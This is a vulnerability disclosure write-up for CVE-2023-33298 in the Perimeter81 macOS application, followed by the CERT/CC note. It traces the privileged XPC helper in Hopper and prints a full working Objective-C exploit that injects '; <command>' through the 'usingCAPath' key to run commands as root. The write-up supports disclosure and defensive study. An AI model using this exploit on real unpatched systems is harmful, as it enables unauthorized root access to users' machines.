# Introduction

Today we will be analyzing CVE-2023-33298 which is Local Privilege Escalation inside the Perimeter81 macOS application. We will be exploiting XPC service misconfiguration along with the Command Injection vulnerability
to gain `root` privileges.

# Analysis

Perimeter81 adds an entry to *LaunchDaemons*, and we can examine the content of the `com.perimeter81.osx.HelperTool.plist` located inside `/Library/LaunchDaemons/` directory.

![LaunchDaemon plist file](data:image/png;base64...)

We can see that the key for `MachServices` is dictionary containing `com.perimeter81.osx.HelperTool`. This is the name of mach service which is exposed by the
*com.perimeter81.osx.HelperTool* binary.

If we now load `/Library/PrivilegedHelperTools/com.perimeter81.osx.HelperTool` inside the Hopper and search for `xpc_connection_create_mach_service` we can
confirm that the function is called with `com.perimeter81.osx.HelperTool` as first argument.

![Mach Service Creation](data:image/png;base64...)

From the image, we can also see that it calls `xpc_connection_set_event_handler` with `&var_40`. We can read [documentation](https://clang.llvm.org/docs/Block-ABI-Apple.html) and
conlude that the structure contains `isa` pointer (which type of block is this), followed by two ints(flags and reserved) and finally `void (*invoke)(void *, ...);` function pointer
which points to the actualy compiled block body.

Inside the disassembly, we can see that `*(&var_40 + 0x10) = sub_1002169d7;` points to `sub_1002169d7`. Let’s now examine this function.

![Main connection handler](data:image/png;base64...)

Inside the `else` we can see another call to `xpc_connection_set_event_handler` with the block that has `invoke` pointer set to `sub_100216a98`. Double clicking on this sub shows the following code.

![Peer connection handler](data:image/png;base64...)

Based on this function we can conclude the following:

* We need to send the dictionary
* `type` inside the dictionary needs to be `rpc` or `helper_tool_rpc`.
* Function `sub_100216d6c` is called in multiple branches so we will check what that is
* We can also see that we have a line `r12 = xpc_dictionary_get_string(r13, "rpc");` followed by the check whether *r12* is equal to *start\_connection* so we can conclude that the key *rpc* will contain some kind of function what to do.

Inspecting the `sub_100216d6c` function shows that it calls `-[SDHelperTool handleTargetServiceCommand:withRequest:withReply:]`.

![HandleTargetService](data:image/png;base64...)

Since this method is a bit bigger, we will show only the beginning and the end of the function which are interesting.

![Check for target service](data:image/png;base64...)

We can see that it tries to extract the `parameters` and `target_service` keys. If `target_service` is NULL, it jumps to `loc_10020a119`.

![Creation of generalInvoker selector](data:image/png;base64...)

We can see that it saves `@selector(generalInvoker)` inside the `rax` register and then jumps back to `loc_10020a1c0`. `loc_10020a1c0` just calls `handleXPCServiceCommand:withParameters:withReply`.

![Calling handleXPCServiceCommand](data:image/png;base64...)

If we search for “generalInvoker” in Hopper we can see that we have a match for `-[SDHelperTool setup_GeneralInvoker]` which allocates new object of class *SDHelperTool\_InvokerGeneral*.

![setup_GeneralInvoker](data:image/png;base64...)

Searching for `DHelperTool_InvokerGeneral` reveals a lot of methods. After digging around a bit, I have found `install_SDP_CA:withReply:` which calls `security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain %@` with the value from dictionary under the key `usingCAPath`. This is typical command injection where we can simply append `;` followed by the command we want to execute.

![Searching for DHelperTool_InvokerGeneral](data:image/png;base64...)

![install_SDP_CA method](data:image/png;base64...)

So to recap, our exploit should do the following:

* call `xpc_connection_create_mach_service` with `com.perimeter81.osx.HelperTool` as a name
* create a dictionary for **properties** with the key **usingCAPath** and value as **; some command to run as root**
* create another dictionary that will be our message with `type` as `helper_tool_rpc`, `rpc` as `install_SDP_CA`, and key `parameters` set to the previous dictionary
* send the message

# Full exploit

Full exploit looks like the following:

```
#import <Foundation/Foundation.h>

#define NAME "com.perimeter81.osx.HelperTool"

int main(int argc, const char **argv) {
    if (argc != 2) {
        printf("missing cmd to execute\n");
        exit(1);
    }

    xpc_connection_t conn = xpc_connection_create_mach_service(NAME, NULL, 0);
    xpc_connection_set_event_handler(conn, ^(xpc_object_t object){
        NSLog(@"client received event: %s", xpc_copy_description(object));
    });
    xpc_connection_resume(conn);

    const char *c = argv[1];

    char cmd[250];
    sprintf(cmd, "; %s", c);

    // create dictionary to hold our parameters
    // method name and its parameters
    xpc_object_t params = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_string(params, "usingCAPath", cmd);

    // create dictionary to send over xpc
    xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_string(message, "type", "helper_tool_rpc");
    xpc_dictionary_set_string(message, "rpc", "install_SDP_CA");
    xpc_dictionary_set_value(message, "parameters", params);

    xpc_connection_send_message_with_reply(conn, message, dispatch_get_main_queue(), ^(xpc_object_t object){
        NSLog(@"Executed cmd: \"%s\"\n", c);
    });

    // create run loop so we can get async result for our command, otherwise the exploit would exit after sending the
    // message
    dispatch_main();

    return 0;
}

```

| 16th May 2023 | Contacted VINCE to coordinate disclosure |

VINCE tried to contact them multiple times without success, so after more than three months I have decided to disclose the vulnerability.

## Update

Perimeter81 released fix for this in the version [10.1.2.318](https://support.perimeter81.com/docs/macos-agent-release-notes) on the 25th of July.

## Perimeter81 macOS Application Multiple Vulnerabilities

#### Vulnerability Note VU#653767

Original Release Date: 2023-07-20 | Last Revised: 2023-07-31

---

### Overview

A command injection vulnerability can be used in the Perimeter81 macOS application to run arbitrary commands with administrative privileges.

### Description

At the time, the latest Perimeter81 MacOS application (10.0.0.19) suffers from local privilege escalation vulnerability inside its com.perimeter81.osx.HelperTool. This HelperTool allows main application to setup things which require administrative privileges such as VPN connection, changing routing table, etc.

By combining insufficient checks of an XPC connection and creating a dictionary with the key "usingCAPath" a command can be appended within that value to be run with administrative privileges.

### Impact

By exploiting the vulnerability, attackers can run arbitrary commands with administrative privileges.

### Solution

Perimeter81 has released a fix in version 10.1.2.318
(https://support.perimeter81.com/docs/macos-agent-release-notes)
